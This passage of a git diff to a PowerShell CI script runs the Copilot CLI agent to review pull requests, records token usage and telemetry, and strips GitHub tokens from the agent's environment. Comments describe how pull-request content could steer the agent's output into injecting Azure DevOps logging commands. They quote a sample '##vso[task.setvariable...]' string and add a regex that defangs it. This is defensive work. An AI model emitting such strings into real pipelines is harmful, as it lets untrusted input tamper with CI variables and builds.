+        if ($null -eq $outputTokens -and $null -ne $OtelMetrics.outputTokens) { $outputTokens = $OtelMetrics.outputTokens }
+        if ($null -eq $cachedInputTokens -and $null -ne $OtelMetrics.cachedInputTokens) { $cachedInputTokens = $OtelMetrics.cachedInputTokens }
+        if ($null -eq $totalTokens -and $null -ne $OtelMetrics.totalTokens) { $totalTokens = $OtelMetrics.totalTokens }
+        $reasoningOutputTokens = $OtelMetrics.reasoningOutputTokens
+        $copilotCost = $OtelMetrics.copilotCost
+        $otelFile = $OtelMetrics.file
+    }
+
+    # Keep billing units separate — never fall back across unit types (AIC credits vs dollar
+    # cost vs request count). Collapsing them into one field produces meaningless aggregate
+    # sums (credits + dollars + counts) for the downstream consumer.
+    $aicUsed = $AicUsed
+    $premiumRequests = Get-ObjectMemberValue -InputObject $Usage -Names @('premiumRequests')
+    if (Test-IsNumericValue $premiumRequests) {
+        $premiumRequests = [double]$premiumRequests
+    } else {
+        $premiumRequests = $null
+    }
+
+    return [ordered]@{
+        schemaVersion         = 1
+        generatedAtUtc        = ([DateTimeOffset]::UtcNow).ToString('o')
+        prNumber              = $PRNumber
+        platform              = $Platform
+        pipeline              = [ordered]@{
+            buildId        = $env:BUILD_BUILDID
+            buildNumber    = $env:BUILD_BUILDNUMBER
+            definitionName = $env:BUILD_DEFINITIONNAME
+            stageName      = $env:SYSTEM_STAGENAME
+            jobName        = $env:SYSTEM_JOBNAME
+            jobDisplayName = $env:SYSTEM_JOBDISPLAYNAME
+            taskInstanceId = $env:SYSTEM_TASKINSTANCEID
+        }
+        scriptPhase           = if ($Phase) { $Phase } else { 'All' }
+        copilotStep           = $StepName
+        model                 = $ModelName
+        startedAtUtc          = $StartedAtUtc.ToString('o')
+        endedAtUtc            = $EndedAtUtc.ToString('o')
+        durationMs            = $DurationMs
+        apiDurationMs         = $apiDurationMs
+        resultEventSeen       = $ResultEventSeen
+        exitCode              = $ExitCode
+        turnCount             = $TurnCount
+        toolCount             = $ToolCount
+        failedToolCount       = $FailedToolCount
+        cliUsage              = [ordered]@{
+            aicUsed          = $aicUsed
+            copilotCost      = $copilotCost
+            premiumRequests  = $premiumRequests
+            contextWindow    = $ContextWindow
+            contextWindowRaw = $ContextWindowRaw
+        }
+        normalizedTokens      = [ordered]@{
+            inputTokens           = $inputTokens
+            outputTokens          = $outputTokens
+            cachedInputTokens     = $cachedInputTokens
+            reasoningOutputTokens = $reasoningOutputTokens
+            totalTokens           = $totalTokens
+            rawTokenFields        = @($usageTokenMetrics.rawTokenFields)
+            otelFile              = $otelFile
+        }
+        usage                 = $Usage
+        costEstimateAvailable = $false
+        costEstimateNote      = 'Dollar cost not calculated; no trusted rate table configured.'
+    }
+}
+
+function Write-CopilotTokenUsageRecord {
+    param(
+        [string]$OutputDir,
+        [object]$Record
+    )
+
+    if ([string]::IsNullOrWhiteSpace($OutputDir) -or $null -eq $Record) {
+        return
+    }
+
+    try {
+        New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
+        $stepName = [string]$Record.copilotStep
+        $safeStepName = ($stepName -replace '[^A-Za-z0-9._-]+', '-').Trim('-')
+        if ([string]::IsNullOrWhiteSpace($safeStepName)) {
+            $safeStepName = 'copilot-step'
+        }
+
+        $timestamp = [DateTimeOffset]::UtcNow.ToString('yyyyMMddTHHmmssfffZ')
+        $fileName = "copilot-token-usage-$timestamp-$safeStepName-$([guid]::NewGuid().ToString('N')).json"
+        $path = Join-Path $OutputDir $fileName
+        $Record | ConvertTo-Json -Depth 50 | Set-Content -Path $path -Encoding UTF8
+        Write-Host "  Token usage record: $path" -ForegroundColor DarkGray
+    } catch {
+        Write-Host "  WARNING: Failed to write Copilot token usage record: $_" -ForegroundColor Yellow
+    }
+}
+
 # ─── Helper: Invoke Copilot ──────────────────────────────────────────────────
 function Invoke-CopilotStep {
     param([string]$StepName, [string]$Prompt)
@@ -448,12 +1122,18 @@ function Invoke-CopilotStep {
         return 0
     }
 
+    $startedAtUtc = [DateTimeOffset]::UtcNow
     $stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
     $toolCount = 0
     $turnCount = 0
     $currentIntent = ""
     $modelName = ""
     $failedTools = @()
+    $resultEventSeen = $false
+    $resultUsage = $null
+    $cliAicUsed = $null
+    $cliContextWindow = $null
+    $cliContextWindowRaw = $null
 
     # Tool icon mapping for common tools
     $toolIcons = @{
@@ -467,136 +1147,217 @@ function Invoke-CopilotStep {
     }
 
     # Use JSON output format to stream live progress of agent activity.
+    # --secret-env-vars: defense-in-depth — strips named tokens from copilot's
+    # shell/MCP subprocess env even if they somehow appear (e.g., via variable groups).
     # Model is overridable via $env:COPILOT_REVIEW_MODEL so contributors without internal-model access
     # can run this script (e.g., with 'claude-opus-4.6' or 'claude-sonnet-4.6').
     $copilotModel = if ($env:COPILOT_REVIEW_MODEL) { $env:COPILOT_REVIEW_MODEL } else { 'gpt-5.5' }
-    & copilot -p $Prompt --allow-all --output-format json --model $copilotModel 2>&1 | ForEach-Object {
-        $line = $_.ToString()
-        try {
-            $event = $line | ConvertFrom-Json -ErrorAction Stop
-            switch ($event.type) {
-                'session.tools_updated' {
-                    if ($event.data.model) {
-                        $modelName = $event.data.model
-                        Write-Host "  ⚙️  Model: " -ForegroundColor DarkGray -NoNewline
-                        Write-Host $modelName -ForegroundColor DarkCyan
-                    }
-                }
-                'assistant.turn_start' {
-                    $turnCount++
-                    $elapsed = $stopwatch.Elapsed.ToString("mm\:ss")
-                    Write-Host ""
-                    Write-Host "  ┌─ Turn $turnCount " -ForegroundColor DarkGray -NoNewline
-                    Write-Host "[$elapsed]" -ForegroundColor DarkYellow -NoNewline
-                    if ($currentIntent) {
-                        Write-Host " · $currentIntent" -ForegroundColor DarkCyan
-                    } else {
-                        Write-Host ""
-                    }
-                }
-                'assistant.turn_end' {
-                    Write-Host "  └─" -ForegroundColor DarkGray
-                }
-                'tool.execution_start' {
-                    $toolName = $event.data.toolName
-                    $args_ = $event.data.arguments
+    if ([string]::IsNullOrWhiteSpace($modelName)) {
+        $modelName = $copilotModel
+    }
+    $safeOtelStepName = ($StepName -replace '[^A-Za-z0-9._-]+', '-').Trim('-')
+    if ([string]::IsNullOrWhiteSpace($safeOtelStepName)) {
+        $safeOtelStepName = 'copilot-step'
+    }
+    $otelPath = $null
+    if (-not [string]::IsNullOrWhiteSpace($TokenUsageOutputDir)) {
+        New-Item -ItemType Directory -Path $TokenUsageOutputDir -Force | Out-Null
+        $otelPath = Join-Path $TokenUsageOutputDir "copilot-otel-$([DateTimeOffset]::UtcNow.ToString('yyyyMMddTHHmmssfffZ'))-$safeOtelStepName-$([guid]::NewGuid().ToString('N')).jsonl"
+    }
 
-                    # Capture intent changes silently
-                    if ($toolName -eq 'report_intent') {
-                        $currentIntent = $args_.intent ?? $currentIntent
-                        Write-Host "  │  🎯 " -ForegroundColor DarkGray -NoNewline
-                        Write-Host $currentIntent -ForegroundColor Yellow
-                        break
-                    }
+    $savedOtel = @{
+        COPILOT_OTEL_FILE_EXPORTER_PATH = $env:COPILOT_OTEL_FILE_EXPORTER_PATH
+        COPILOT_OTEL_EXPORTER_TYPE      = $env:COPILOT_OTEL_EXPORTER_TYPE
+        OTEL_INSTRUMENTATION_GENAI_CAPTURE_MESSAGE_CONTENT = $env:OTEL_INSTRUMENTATION_GENAI_CAPTURE_MESSAGE_CONTENT
+    }
+    try {
+        if ($otelPath) {
+            $env:COPILOT_OTEL_FILE_EXPORTER_PATH = $otelPath
+            $env:COPILOT_OTEL_EXPORTER_TYPE = 'file'
+            $env:OTEL_INSTRUMENTATION_GENAI_CAPTURE_MESSAGE_CONTENT = 'false'
+        }
 
-                    $toolCount++
-                    $icon = $toolIcons[$toolName]
-                    if (-not $icon) {
-                        # Prefix match for github-mcp-server-* and other compound names
-                        $icon = if ($toolName -like 'github-*') { '🔀' } else { '🔧' }
-                    }
-
-                    # Build a short display name for long tool names
-                    $displayName = $toolName -replace '^github-mcp-server-', 'gh/'
-
-                    # Pick the most useful detail from arguments
-                    $detail = $args_.description ?? $args_.intent ?? ''
-                    if (-not $detail) {
-                        # Fallback: pick first informative arg
-                        $detail = $args_.command ?? $args_.pattern ?? $args_.query ?? $args_.path ?? $args_.prompt ?? ''
-                    }
-                    if ($detail) {
-                        $detail = $detail.Substring(0, [Math]::Min($detail.Length, 90))
-                        # Truncate at last word boundary if we cut mid-word
-                        if ($detail.Length -eq 90) {
-                            $lastSpace = $detail.LastIndexOf(' ')
-                            if ($lastSpace -gt 60) { $detail = $detail.Substring(0, $lastSpace) + "…" }
-                            else { $detail += "…" }
+        & copilot -p $Prompt --allow-all --output-format json --model $copilotModel --secret-env-vars=GH_TOKEN,COPILOT_GITHUB_TOKEN,GITHUB_TOKEN 2>&1 | ForEach-Object {
+            $line = $_.ToString()
+            try {
+                $event = $line | ConvertFrom-Json -ErrorAction Stop
+                switch ($event.type) {
+                    'session.tools_updated' {
+                        if ($event.data.model) {
+                            $modelName = $event.data.model
+                            Write-Host "  ⚙️  Model: " -ForegroundColor DarkGray -NoNewline
+                            Write-Host $modelName -ForegroundColor DarkCyan
                         }
                     }
-
-                    Write-Host "  │  $icon " -ForegroundColor DarkGray -NoNewline
-                    Write-Host $displayName -ForegroundColor Cyan -NoNewline
-                    if ($detail) {
-                        Write-Host "  $detail" -ForegroundColor DarkGray
-                    } else {
-                        Write-Host ""
-                    }
-                }
-                'tool.execution_complete' {
-                    if (-not $event.data.success) {
-                        $failedTool = $event.data.toolCallId
-                        $failedTools += $failedTool
-                        Write-Host "  │  ❌ Tool failed" -ForegroundColor Red
-                    }
-                }
-                'assistant.message' {
-                    $content = $event.data.content
-                    # Show agent text responses (skip empty tool-request-only messages)
-                    if ($content -and $content.Trim()) {
-                        $preview = $content.Trim()
-                        if ($preview.Length -gt 400) {
-                            $preview = $preview.Substring(0, 400) + "…"
-                        }
-                        Write-Host "  │  💬 " -ForegroundColor DarkGray -NoNewline
-                        Write-Host $preview -ForegroundColor White
-                    }
-                }
-                'result' {
-                    # Final stats — note: 'result' is a top-level event with no 'data' wrapper.
-                    $usage = $event.usage
-                    if ($usage) {
+                    'assistant.turn_start' {
+                        $turnCount++
                         $elapsed = $stopwatch.Elapsed.ToString("mm\:ss")
-                        $apiMs = if ($usage.totalApiDurationMs) { [math]::Round($usage.totalApiDurationMs / 1000, 1) } else { "?" }
-                        $changes = $usage.codeChanges
-                        $filesChanged = if ($changes -and $changes.filesModified) { @($changes.filesModified).Count } else { 0 }
-                        $linesAdded = if ($changes) { $changes.linesAdded } else { 0 }
-                        $linesRemoved = if ($changes) { $changes.linesRemoved } else { 0 }
-
                         Write-Host ""
-                        Write-Host "  ╭──────────────────────────────────────────╮" -ForegroundColor DarkGray
-                        Write-Host "  │  ⏱  $elapsed elapsed  ($($apiMs)s API)" -ForegroundColor DarkGray -NoNewline
-                        Write-Host "  │  🔧 $toolCount tools" -ForegroundColor DarkGray -NoNewline
-                        Write-Host "  │  🔄 $turnCount turns" -ForegroundColor DarkGray
-                        if ($filesChanged -gt 0 -or $linesAdded -gt 0 -or $linesRemoved -gt 0) {
-                            Write-Host "  │  📝 $filesChanged files  " -ForegroundColor DarkGray -NoNewline
-                            Write-Host "+$linesAdded" -ForegroundColor Green -NoNewline
-                            Write-Host "/" -ForegroundColor DarkGray -NoNewline
-                            Write-Host "-$linesRemoved" -ForegroundColor Red
+                        Write-Host "  ┌─ Turn $turnCount " -ForegroundColor DarkGray -NoNewline
+                        Write-Host "[$elapsed]" -ForegroundColor DarkYellow -NoNewline
+                        if ($currentIntent) {
+                            Write-Host " · $currentIntent" -ForegroundColor DarkCyan
+                        } else {
+                            Write-Host ""
                         }
-                        Write-Host "  ╰──────────────────────────────────────────╯" -ForegroundColor DarkGray
                     }
+                    'assistant.turn_end' {
+                        Write-Host "  └─" -ForegroundColor DarkGray
+                    }
+                    'tool.execution_start' {
+                        $toolName = $event.data.toolName
+                        $args_ = $event.data.arguments
+
+                        # Capture intent changes silently
+                        if ($toolName -eq 'report_intent') {
+                            # Sanitize once at the store so every later echo (incl. the
+                            # assistant.turn_start " · $currentIntent" line) inherits the safe value.
+                            $currentIntent = ConvertTo-AzdoSafeConsole ($args_.intent ?? $currentIntent)
+                            Write-Host "  │  🎯 " -ForegroundColor DarkGray -NoNewline
+                            Write-Host $currentIntent -ForegroundColor Yellow
+                            break
+                        }
+
+                        $toolCount++
+                        $icon = $toolIcons[$toolName]
+                        if (-not $icon) {
+                            # Prefix match for github-mcp-server-* and other compound names
+                            $icon = if ($toolName -like 'github-*') { '🔀' } else { '🔧' }
+                        }
+
+                        # Build a short display name for long tool names
+                        $displayName = ConvertTo-AzdoSafeConsole ($toolName -replace '^github-mcp-server-', 'gh/')
+
+                        # Pick the most useful detail from arguments
+                        $detail = $args_.description ?? $args_.intent ?? ''
+                        if (-not $detail) {
+                            # Fallback: pick first informative arg
+                            $detail = $args_.command ?? $args_.pattern ?? $args_.query ?? $args_.path ?? $args_.prompt ?? ''
+                        }
+                        if ($detail) {
+                            $detail = $detail.Substring(0, [Math]::Min($detail.Length, 90))
+                            # Truncate at last word boundary if we cut mid-word
+                            if ($detail.Length -eq 90) {
+                                $lastSpace = $detail.LastIndexOf(' ')
+                                if ($lastSpace -gt 60) { $detail = $detail.Substring(0, $lastSpace) + "…" }
+                                else { $detail += "…" }
+                            }
+                        }
+
+                        Write-Host "  │  $icon " -ForegroundColor DarkGray -NoNewline
+                        Write-Host $displayName -ForegroundColor Cyan -NoNewline
+                        if ($detail) {
+                            Write-Host "  $(ConvertTo-AzdoSafeConsole $detail)" -ForegroundColor DarkGray
+                        } else {
+                            Write-Host ""
+                        }
+                    }
+                    'tool.execution_complete' {
+                        if (-not $event.data.success) {
+                            $failedTool = $event.data.toolCallId
+                            $failedTools += $failedTool
+                            Write-Host "  │  ❌ Tool failed" -ForegroundColor Red
+                        }
+                    }
+                    'assistant.message' {
+                        $content = $event.data.content
+                        # Show agent text responses (skip empty tool-request-only messages)
+                        if ($content -and $content.Trim()) {
+                            $preview = $content.Trim()
+                            if ($preview.Length -gt 400) {
+                                $preview = $preview.Substring(0, 400) + "…"
+                            }
+                            # Agent message content is PR-influenceable; defang AzDO logging-command
+                            # prefixes + strip CR before echoing so it can't inject a pipeline command.
+                            $preview = ConvertTo-AzdoSafeConsole $preview
+                            Write-Host "  │  💬 " -ForegroundColor DarkGray -NoNewline
+                            Write-Host $preview -ForegroundColor White
+                        }
+                    }
+                    'result' {
+                        # Final stats — note: 'result' is a top-level event with no 'data' wrapper.
+                        $resultEventSeen = $true
+                        $usage = $event.usage
+                        $resultUsage = $usage
+                        if ($usage) {
+                            $elapsed = $stopwatch.Elapsed.ToString("mm\:ss")
+                            $apiMs = if ($usage.totalApiDurationMs) { [math]::Round($usage.totalApiDurationMs / 1000, 1) } else { "?" }
+                            $changes = $usage.codeChanges
+                            $filesChanged = if ($changes -and $changes.filesModified) { @($changes.filesModified).Count } else { 0 }
+                            $linesAdded = if ($changes) { $changes.linesAdded } else { 0 }
+                            $linesRemoved = if ($changes) { $changes.linesRemoved } else { 0 }
+
+                            Write-Host ""
+                            Write-Host "  ╭──────────────────────────────────────────╮" -ForegroundColor DarkGray
+                            Write-Host "  │  ⏱  $elapsed elapsed  ($($apiMs)s API)" -ForegroundColor DarkGray -NoNewline
+                            Write-Host "  │  🔧 $toolCount tools" -ForegroundColor DarkGray -NoNewline
+                            Write-Host "  │  🔄 $turnCount turns" -ForegroundColor DarkGray
+                            if ($filesChanged -gt 0 -or $linesAdded -gt 0 -or $linesRemoved -gt 0) {
+                                Write-Host "  │  📝 $filesChanged files  " -ForegroundColor DarkGray -NoNewline
+                                Write-Host "+$linesAdded" -ForegroundColor Green -NoNewline
+                                Write-Host "/" -ForegroundColor DarkGray -NoNewline
+                                Write-Host "-$linesRemoved" -ForegroundColor Red
+                            }
+                            Write-Host "  ╰──────────────────────────────────────────╯" -ForegroundColor DarkGray
+                        }
+                    }
+                }
+            } catch {
+                $cliLineData = Get-CopilotCliUsageLineData -Line $line
+                if ($cliLineData.Contains('aicUsed')) {
+                    $cliAicUsed = $cliLineData.aicUsed
+                }
+                if ($cliLineData.Contains('contextWindow')) {
+                    $cliContextWindow = $cliLineData.contextWindow
+                    $cliContextWindowRaw = $cliLineData.contextWindowRaw
+                }
+                if ($cliLineData.Contains('model') -and -not [string]::IsNullOrWhiteSpace([string]$cliLineData.model)) {
+                    $modelName = [string]$cliLineData.model
+                }
+
+                # Non-JSON line (e.g. stats) — strip CR and defang any AzDO logging-command
+                # prefix (##vso[ / ##[) so PR-influenced Copilot output can't inject a
+                # pipeline command (e.g. "\r##vso[task.setvariable...]"), then echo as-is.
+                if ($line.Trim()) {
+                    $safeLine = ($line -replace "`r", '') -replace '##(?=\[|vso\[)', '## '
+                    Write-Host "  $safeLine" -ForegroundColor DarkGray
                 }
             }
-        } catch {
-            # Non-JSON line (e.g. stats) — pass through as-is
-            if ($line.Trim()) {
-                Write-Host "  $line" -ForegroundColor DarkGray
+        }
+    } finally {
+        foreach ($key in $savedOtel.Keys) {
+            if ($null -eq $savedOtel[$key]) {
+                Remove-Item -Path ("env:" + $key) -ErrorAction SilentlyContinue
+            } else {
+                Set-Item -Path ("env:" + $key) -Value $savedOtel[$key]
             }
         }
     }
     $exitCode = $LASTEXITCODE
     $stopwatch.Stop()
+    $endedAtUtc = [DateTimeOffset]::UtcNow
+    $otelMetrics = Get-CopilotOtelTokenMetrics -Path $otelPath
+
+    $usageRecord = New-CopilotTokenUsageRecord `
+        -PRNumber $PRNumber `
+        -Platform $Platform `
+        -Phase $Phase `
+        -StepName $StepName `
+        -ModelName $modelName `
+        -StartedAtUtc $startedAtUtc `
+        -EndedAtUtc $endedAtUtc `
+        -DurationMs $stopwatch.ElapsedMilliseconds `
+        -TurnCount $turnCount `
+        -ToolCount $toolCount `
+        -FailedToolCount (@($failedTools).Count) `
+        -Usage $resultUsage `
+        -OtelMetrics $otelMetrics `
+        -AicUsed $cliAicUsed `
+        -ContextWindow $cliContextWindow `
+        -ContextWindowRaw $cliContextWindowRaw `
+        -ResultEventSeen $resultEventSeen `
+        -ExitCode $exitCode
+    Write-CopilotTokenUsageRecord -OutputDir $TokenUsageOutputDir -Record $usageRecord
 
     if ($exitCode -eq 0) {
         Write-Host "  ✅ $StepName completed" -ForegroundColor Green
@@ -613,6 +1374,8 @@ function Invoke-CopilotStep {
 #  STEP 2: DETECT UI Test Categories (detection only — no pipeline trigger)
 # ═════════════════════════════════════════════════════════════════════════════
 
+if ($runGate) {
+
 Write-Host ""
 Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
 Write-Host "║  STEP 2: DETECT UI TEST CATEGORIES                       ║" -ForegroundColor Cyan
@@ -620,7 +1383,7 @@ Write-Host "╚═════════════════════�
 
 $uitestCategories = ""
 
-$detectScript = Join-Path $RepoRoot "eng/scripts/detect-ui-test-categories.ps1"
+$detectScript = Join-Path $EngScriptsDir "detect-ui-test-categories.ps1"
 if (Test-Path $detectScript) {
     try {
         $detectOutput = & pwsh -NoProfile -File $detectScript -PrNumber "$PRNumber" 2>&1
@@ -647,10 +1410,10 @@ if (Test-Path $detectScript) {
 
         # Emit detected categories as an AzDO output variable so downstream
         # stages (RunDeepUITests, UpdateAISummaryComment) in ci-copilot.yml
-        # can read them via $(stageDependencies.ReviewPR.CopilotReview.outputs['RunReview.detectedCategories']).
+        # can read them via $(stageDependencies.ReviewPR.CopilotReview.outputs['RunGate.detectedCategories']).
         # `isOutput=true` is required for cross-stage consumption; the
         # variable name is namespaced under the step's `name:` property
-        # in ci-copilot.yml (currently `RunReview`) by AzDO.
+        # in ci-copilot.yml (currently `RunGate`) by AzDO.
         # Local invocations (no $env:TF_BUILD) won't have an AzDO variable
         # store but the marker is harmless — gets ignored.
         # Emit detected categories. Blank = "run all", a specific string = categories,
@@ -690,461 +1453,16 @@ if ($LASTEXITCODE -ne 0) {
 }
 
 # ═════════════════════════════════════════════════════════════════════════════
-#  STEP 3: RUN DETECTED UI TEST CATEGORIES (script, no copilot agent)
-# ═════════════════════════════════════════════════════════════════════════════
-# Runs the UI test categories that Step 2 detected. Skipped when:
-#   - $uitestCategories is 'NONE'        (no UI-relevant changes)
-#   - $uitestCategories is empty/blank    (run-all matrix — too expensive locally)
-# Results are appended to the existing uitests/content.md so they show up in
-# the same collapsible section of the AI summary comment.
-
-Write-Host ""
-Write-Host "╔═══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
-Write-Host "║  STEP 3: RUN DETECTED UI TESTS                            ║" -ForegroundColor Cyan
-Write-Host "╚═══════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
-
-$uitestRunResult = "SKIPPED"
-$uitestRunnerScript = Join-Path $PSScriptRoot "BuildAndRunHostApp.ps1"
-
-if ($uitestCategories -eq 'NONE') {
-    Write-Host "  ⏭️  Skipped — detection returned NONE (no UI-relevant changes)" -ForegroundColor DarkGray
-} elseif ([string]::IsNullOrWhiteSpace($uitestCategories)) {
-    Write-Host "  ⏭️  Skipped — detection returned the run-all matrix (too expensive to run all categories locally)" -ForegroundColor DarkGray
-} elseif (-not (Test-Path $uitestRunnerScript)) {
-    Write-Host "  ⚠️ BuildAndRunHostApp.ps1 not found — cannot run UI tests" -ForegroundColor Yellow
-} else {
-    # Mirror the regression-test platform fallback so a $Platform-less invocation
-    # still has a concrete target instead of silently picking nothing.
-    $uitestPlatform = if ($Platform) { $Platform } else { "android" }
-
-    $categoryList = @($uitestCategories -split ',' | ForEach-Object { $_.Trim() } | Where-Object { $_ })
-    Write-Host "  🧪 Running $($categoryList.Count) detected UI category(ies) on '$uitestPlatform'…" -ForegroundColor Cyan
-
-    $uitestRunOutputDir = Join-Path $RepoRoot "CustomAgentLogsTmp/PRState/$PRNumber/PRAgent/uitests"
-    New-Item -ItemType Directory -Force -Path $uitestRunOutputDir | Out-Null
-
-    $uitestPassed = 0
-    $uitestFailed = 0
-    $uitestSkipped = 0
-    $uitestDetails = @()
-
-    foreach ($cat in $categoryList) {
-        Write-Host ""
-        Write-Host "  📋 [$cat] Invoke-UITestWithRetry -Platform $uitestPlatform -Category $cat" -ForegroundColor Cyan
-
-        # Delegate to the shared deploy+retry script so STEP 3 uses the
-        # SAME pre-boot + retry-on-env-error + device-reboot pipeline as
-        # the Gate (verify-tests-fail.ps1's Invoke-TestRun +
-        # Invoke-TestRunWithRetry). When the Android emulator/iOS sim
-        # rejects an install ("ADB0010 Broken pipe", XHarness exit 83,
-        # AppiumServerHasNotBeenStartedLocally, …) the helper retries up
-        # to 3 times with adb reboot / simctl boot recovery between
-        # attempts. Without this, a single transient install failure was
-        # turning into "119 OneTimeSetUp timeouts" in the AI summary.
-        $catLogPath = Join-Path $uitestRunOutputDir ("$cat-output.log")
-        $catStart = Get-Date
-        $sharedRunner = Join-Path $PSScriptRoot "shared/Invoke-UITestWithRetry.ps1"
-        $runResult = $null
-        $testOutput = @()
-        $testExitCode = -1
-        $envErrHit = $null
-        try {
-            $runResult = & $sharedRunner `
-                -Platform $uitestPlatform `
-                -Category $cat `
-                -RepoRoot $RepoRoot `
-                -LogFile $catLogPath
-            if ($runResult) {
-                $testOutput   = $runResult.Output
-                $testExitCode = $runResult.ExitCode
-                $envErrHit    = $runResult.EnvErrorHit
-                Write-Host "    Attempts: $($runResult.Attempts) · Exit: $testExitCode · EnvError: $envErrHit" -ForegroundColor Gray
-                $testOutput | Select-Object -Last 20 | ForEach-Object { Write-Host "    $_" }
-            }
-        } catch {
-            Write-Host "    ⚠️ Shared runner threw: $_" -ForegroundColor Yellow
-            $testExitCode = -1
-        }
-        $catDuration = [math]::Round(((Get-Date) - $catStart).TotalSeconds, 1)
-
-        # Parse per-test results. We prefer the TRX file written by
-        # `dotnet test --logger trx` (mirrors CI pipeline 313's
-        # `RunTestWithLocalDotNet`) — it's authoritative because it captures
-        # every test's outcome, duration, error and stack regardless of
-        # how the console output got wrapped or interleaved. We only fall
-        # back to scraping the captured stdout via Get-DotNetTestResults
-        # when the TRX is missing (build/deploy crashed before tests ran,
-        # or an older BuildAndRunHostApp.ps1 ran without --logger trx).
-        $perTestResults = @()
-        $trxAggregate   = $null
-        $trxPath        = if ($runResult) { [string]$runResult.TrxResultFile } else { $null }
-        if ($trxPath -and (Test-Path $trxPath)) {
-            try {
-                $trxAggregate = Get-TrxResults -TrxPath $trxPath
-                if ($trxAggregate) {
-                    $perTestResults = @($trxAggregate.Results)
-                    Write-Host "    📄 TRX parsed: total=$($trxAggregate.Total) passed=$($trxAggregate.Passed) failed=$($trxAggregate.Failed) skipped=$($trxAggregate.Skipped)" -ForegroundColor Cyan
-                }
-            } catch {
-                Write-Host "    ⚠️ Failed to parse TRX $trxPath : $_" -ForegroundColor Yellow
-            }
-        }
-        if (-not $trxAggregate) {
-            try {
-                $perTestResults = @(Get-DotNetTestResults -Lines $testOutput)
-            } catch {
-                Write-Host "    ⚠️ Failed to parse per-test results: $_" -ForegroundColor Yellow
-            }
-        }
-        $catFailedTests = @($perTestResults | Where-Object { $_.status -eq 'Failed' })
-        $catPassedTests = @($perTestResults | Where-Object { $_.status -eq 'Passed' })
-        # Authoritative aggregate counts: TRX > per-test array. (When the TRX
-        # is present its <Counters total="N" .../> attribute beats counting
-        # array items because VSTest may report retries/skips that aren't in
-        # individual <UnitTestResult> nodes.)
-        if ($trxAggregate) {
-            $catTotalCount  = [int]$trxAggregate.Total
-            $catPassedCount = [int]$trxAggregate.Passed
-            $catFailedCount = [int]$trxAggregate.Failed
-        } else {
-            $catTotalCount  = $perTestResults.Count
-            $catPassedCount = $catPassedTests.Count
-            $catFailedCount = $catFailedTests.Count
-        }
-
-        if ($testExitCode -eq 0) {
-            Write-Host "    ✅ PASSED ($catDuration s, $catPassedCount test(s))" -ForegroundColor Green
-            $uitestPassed++
-            $uitestDetails += @{
-                category     = $cat
-                result       = 'PASSED'
-                duration_s   = $catDuration
-                tests_total  = $catTotalCount
-                tests_passed = $catPassedCount
-                tests_failed = 0
-                passed_tests = @($catPassedTests | ForEach-Object { @{ name = $_.name; duration = $_.duration } })
-                failed_tests = @()
-            }
-        } elseif ($testExitCode -eq -1) {
-            Write-Host "    ⏭️ SKIPPED" -ForegroundColor DarkGray
-            $uitestSkipped++
-            $uitestDetails += @{
-                category     = $cat
-                result       = 'SKIPPED'
-                duration_s   = $catDuration
-                reason       = 'Runner threw an exception'
-                tests_total  = 0
-                tests_passed = 0
-                tests_failed = 0
-                passed_tests = @()
-                failed_tests = @()
-            }
-        } else {
-            Write-Host "    ❌ FAILED (exit code: $testExitCode, $catDuration s, $catFailedCount failed test(s))" -ForegroundColor Red
-            foreach ($ft in $catFailedTests) {
-                Write-Host "       • $($ft.name)" -ForegroundColor Red
-            }
-            $uitestFailed++
-            # When per-test parsing found no failures (e.g. build/deploy
-            # crashed before tests ran), capture the last 30 lines of the
-            # category's stdout so the AI summary can show the actual error
-            # (CS0246, RS0016, missing dependency, etc.) instead of just
-            # "exit code 1".
-            $buildTail = $null
-            if ($catFailedCount -eq 0) {
-                try {
-                    $tail = @($testOutput | ForEach-Object { "$_" } | Select-Object -Last 30)
-                    $buildTail = ($tail -join "`n").Trim()
-                } catch { $buildTail = $null }
-            }
-            # Detect infrastructure-level failure: when ALL failures share a
-            # OneTimeSetUp timeout AND the build log shows the HostApp couldn't
-            # be installed/launched (ADB install failure, broken pipe, no
-            # device, etc.), this is a CI infra problem — not real test
-            # regressions. Reviewers shouldn't be alarmed by "119 failed tests"
-            # when the app never even started.
-            #
-            # If $envErrHit was set above, use that — the retry loop already
-            # detected an env error and exhausted retries.
-            # Load shared env-error patterns (single source of truth).
-            $sharedPatternsScript = Join-Path $PSScriptRoot "shared/Get-EnvErrorPatterns.ps1"
-            if (Test-Path $sharedPatternsScript) {
-                . $sharedPatternsScript
-                $infraSignals = Get-EnvErrorPatterns
-            } else {
-                $infraSignals = @(
-                    'InstallFailedException',
-                    'Failure calling service package',
-                    'ADB0010',
-                    'Broken pipe',
-                    'no devices/emulators found',
-                    'device offline',
-                    'Could not connect to device',
-                    'Failed to launch the application',
-                    'cmd: Failure'
-                )
-            }
-            $infraReason = $envErrHit
-            if (-not $infraReason -and $catFailedTests.Count -gt 0) {
-                # Two equally-strong infra-failure indicators:
-                #   (a) every failure is `OneTimeSetUp:` — driver couldn't
-                #       reach the runner UI button.
-                #   (b) the build itself failed (`Build FAILED`) and there
-                #       are zero passes — NUnit then "fails" every test in
-                #       the assembly because the HostApp APK never got
-                #       installed.
-                $logText = ($testOutput | ForEach-Object { "$_" }) -join "`n"
-                $allOneTimeSetup = @($catFailedTests | Where-Object {
-                    ($_.error -as [string]) -match '^OneTimeSetUp:'
-                }).Count -eq $catFailedTests.Count
-                $buildFailedNoPasses = ($catPassedCount -eq 0) -and ($logText -match '(?m)^Build FAILED\.\s*$')
-                if ($allOneTimeSetup -or $buildFailedNoPasses) {
-                    foreach ($sig in $infraSignals) {
-                        if ($logText -match $sig) {
-                            $infraReason = $sig
-                            break
-                        }
-                    }
-                }
-            }
-            $uitestDetails += @{
-                category     = $cat
-                result       = 'FAILED'
-                duration_s   = $catDuration
-                exit_code    = $testExitCode
-                tests_total  = $catTotalCount
-                tests_passed = $catPassedCount
-                tests_failed = $catFailedCount
-                build_tail   = $buildTail
-                infra_failure = $infraReason
-                trx_path     = $trxPath
-                passed_tests = @($catPassedTests | ForEach-Object { @{ name = $_.name; duration = $_.duration } })
-                failed_tests = @($catFailedTests | ForEach-Object {
-                    @{
-                        name     = $_.name
-                        duration = $_.duration
-                        error    = $_.error
-                        stack    = $_.stack
-                    }
-                })
-            }
-        }
-    }
-
-    if ($uitestFailed -gt 0) {
